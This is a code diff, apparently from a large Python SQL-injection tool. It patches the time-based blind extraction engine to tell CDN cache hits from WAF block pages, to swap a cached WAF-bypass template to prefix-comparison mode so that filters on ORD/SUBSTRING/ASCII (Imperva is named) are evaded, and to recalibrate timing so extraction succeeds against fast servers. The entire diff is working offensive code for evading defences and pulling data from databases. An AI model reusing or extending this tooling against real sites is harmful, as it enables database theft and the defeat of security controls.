@@ -144075,7 +144075,16 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 # retry → same WAF block → cascade degradation of extraction efficiency.
                 # Lowering to 130ms correctly targets CDN cache responses (typically 5-80ms)
                 # while excluding WAF blocks (typically 100ms+ round-trip).
-                if fp is not None and 0 < fp.elapsed_ms < 130:
+                # BUG-CDN-WAF-STATUSCODE FIX (HIGH): WAF challenge/block pages are served
+                # with 4xx status codes (403 Forbidden, 429 Too Many Requests, 406 Not
+                # Acceptable). CDN cache hits always return 2xx (200 OK, 304 Not Modified).
+                # Without the status_code check, Imperva WAF blocks at 55ms (HTTP 403) were
+                # classified as CDN cache hits → 30s sleep per probe → retry → same 403 WAF
+                # block → 30s wasted per probe → for 512 probes = 4+ hours of CDN sleeps
+                # before the binary search converges to garbage and the upgrade fires.
+                # Fix: only treat sub-130ms responses as CDN hits when status_code < 400.
+                # A 4xx response under 130ms is a WAF block, not a CDN cache hit.
+                if fp is not None and 0 < fp.elapsed_ms < 130 and fp.status_code < 400:
                     LOG.info("[TBExtract] CDN-cached probe (%.0fms) — waiting 30s", fp.elapsed_ms)
                     try:
                         await asyncio.sleep(30.0)
@@ -144282,10 +144291,40 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
         # Only clear EBF cache when nofunc=False produced empty (meaning the bypass template
         # itself may be failing, not just the extraction conditions).
         if _cal_key in _TB_EBF_CACHE and _ebf_mode[0] and not _ebf_nofunc_ref[0]:
-            LOG.info("[TBExtract] EBF cache invalidated (empty result with nofunc=False bypass)")
-            del _TB_EBF_CACHE[_cal_key]
-        if _cal_key in _TB_CALIBRATION_CACHE and _ebf_mode[0] and not _ebf_nofunc_ref[0]:
-            del _TB_CALIBRATION_CACHE[_cal_key]  # force full re-calibration next call
+            # BUG-NOFUNC-EMPTY-UPGRADE FIX (CRITICAL): When EBF nofunc=False produces empty
+            # result, the root cause is almost always WAF blocking extraction conditions
+            # (ORD/SUBSTRING/ASCII) so all binary-search probes evaluate as False → binary
+            # search converges to 0 → _empty_streak fires → result_str="".
+            # Deleting the EBF cache causes EBF.find() to re-run on the next call and find
+            # THE SAME nofunc=False bypass → same WAF block → same empty → delete → infinite loop.
+            # Fix: upgrade EBF cache to nofunc=True (identical to garbage-guard Case A) instead
+            # of deleting. nofunc=True uses prefix string comparison (no function calls) which
+            # bypasses WAF rules targeting ORD/SUBSTRING/ASCII. Preserve the calibration cache
+            # so the next call skips re-calibration and uses the upgraded nofunc=True entry.
+            # If nofunc=True also returns empty (genuine injection failure or value is empty),
+            # the empty handler with nofunc=True active will NOT re-enter this branch
+            # (condition: `not _ebf_nofunc_ref[0]` is False when nofunc=True) — avoiding
+            # infinite loop. Cache remains valid for continued enumeration with nofunc=True.
+            _cur_ebf_entry = _TB_EBF_CACHE.get(_cal_key)
+            if _cur_ebf_entry is not None and len(_cur_ebf_entry) > 4 and not _cur_ebf_entry[4]:
+                _nofunc_upgraded = (_cur_ebf_entry[0], _cur_ebf_entry[1],
+                                    _cur_ebf_entry[2], _cur_ebf_entry[3], True)
+                _tb_cache_insert(_TB_EBF_CACHE, _cal_key, _nofunc_upgraded, _TB_EBF_CACHE_MAX)
+                # Ensure calibration cache is preserved so next call skips re-calibration
+                if _cal_key not in _TB_CALIBRATION_CACHE:
+                    _tb_cache_insert(_TB_CALIBRATION_CACHE, _cal_key, timing_thresh,
+                                     _TB_CALIBRATION_CACHE_MAX)
+                LOG.info("[TBExtract] Empty result (Case A-empty): EBF upgraded nofunc=False→True "
+                         "(ORD/SUBSTRING WAF-blocked; prefix comparison will be used next call)")
+                print("[+] [TBExtract] EBF bypass upgraded to nofunc=True on empty result "
+                      "(WAF blocks ORD/SUBSTRING extraction conditions; switching to prefix comparison)",
+                      flush=True)
+            else:
+                # nofunc already True or no EBF entry — cache is stale, force re-calibration
+                LOG.info("[TBExtract] EBF cache invalidated (empty result with nofunc=False bypass, no nofunc upgrade possible)")
+                del _TB_EBF_CACHE[_cal_key]
+                if _cal_key in _TB_CALIBRATION_CACHE:
+                    del _TB_CALIBRATION_CACHE[_cal_key]  # force full re-calibration next call
     # Restore original delay
     if _ext_delay is not None:
         config.delay = _orig_delay
@@ -148425,7 +148464,15 @@ class ExtractionOrchestrator:
                 _m = _ms_t - _ms_f
                 LOG.info("[DetTemplate] Cal %d: TRUE=%.0fms FALSE=%.0fms margin=%.0fms",
                          _cal_round + 1, _ms_t, _ms_f, _m)
-                if _ms_t > 30 and _ms_f > 30 and _m > _best_margin:
+                # BUG-DETTEMPLATE-CAL-MSFF FIX (CRITICAL): old condition required _ms_f > 30
+                # which rejects valid calibrations where the false response is fast (e.g. 3ms)
+                # because the server answers immediately when sleep does NOT fire.
+                # Log evidence: Cal 2: TRUE=369ms FALSE=3ms margin=367ms → _best_margin
+                # stayed -9999 because 3ms < 30ms short-circuited the update, causing
+                # calibration to abort even though the timing signal was excellent (367ms margin).
+                # Fix: require only _ms_t > 100 (sleep clearly fired) and _m > _best_margin
+                # (margin improvement). Fast false responses are valid evidence the oracle works.
+                if _ms_t > 100 and _m > _best_margin:
                     _best_margin, _best_ms_t, _best_ms_f = _m, _ms_t, _ms_f
                 if _m >= 80:
                     break
@@ -148445,10 +148492,23 @@ class ExtractionOrchestrator:
                 return ""
             self._dt_thresh = (_best_ms_t + _best_ms_f) / 2
             self._dt_margin = _cal_margin
-            LOG.info("[DetTemplate] Calibrated: thresh=%.0fms margin=%.0fms",
-                     self._dt_thresh, _cal_margin)
+            # BUG-DETTEMPLATE-CAL-MSFF FIX: store false baseline so _eval can compute a
+            # DBMS-adaptive dead-probe floor (instead of the fixed 30ms cutoff which
+            # incorrectly treats legitimate fast false responses as dead probes).
+            self._dt_false_ms = _best_ms_f
+            LOG.info("[DetTemplate] Calibrated: thresh=%.0fms margin=%.0fms false_floor=%.0fms",
+                     self._dt_thresh, _cal_margin, _best_ms_f)
 
         _thresh = self._dt_thresh
+        # BUG-DETTEMPLATE-CAL-MSFF FIX: _eval dead-probe floor must account for
+        # fast-server targets where legitimate false responses are <30ms (e.g. 3ms).
+        # If the stored false baseline is below 30ms, use (false_baseline - 1ms) floored
+        # at 2ms as the dead-probe threshold; otherwise keep the conservative 30ms default.
+        # This prevents _eval from classifying 3ms false responses as "dead probes" when
+        # the calibration confirmed those 3ms responses are valid False oracle reads.
+        _dt_false_floor = getattr(self, '_dt_false_ms', 30.0)
+        _eval_dead_ms = (max(2.0, _dt_false_floor - 1.0)
+                         if _dt_false_floor < 30.0 else 30.0)
 
         # BUG-TH-UNIFORM-TIMING-FIX: WAF challenge pages are served from edge cache
         # at a uniform latency (e.g., 323ms ± 1ms for every probe — regardless of whether
@@ -148462,7 +148522,12 @@ class ExtractionOrchestrator:
 
         async def _eval(cond: str):
             ms = await _probe(cond)
-            if ms < 30:
+            # BUG-DETTEMPLATE-CAL-MSFF FIX: use _eval_dead_ms (calibration-adaptive floor)
+            # instead of the fixed 30ms cutoff. When the server responds in ~3ms for false
+            # conditions, the fixed 30ms floor treats all false responses as dead probes,
+            # causing every length and character probe to return None → all alternate
+            # templates also return None → extraction aborts with return "".
+            if ms < _eval_dead_ms:
                 return None
             # Uniform-stale detection
             _recent_ms.append(ms)
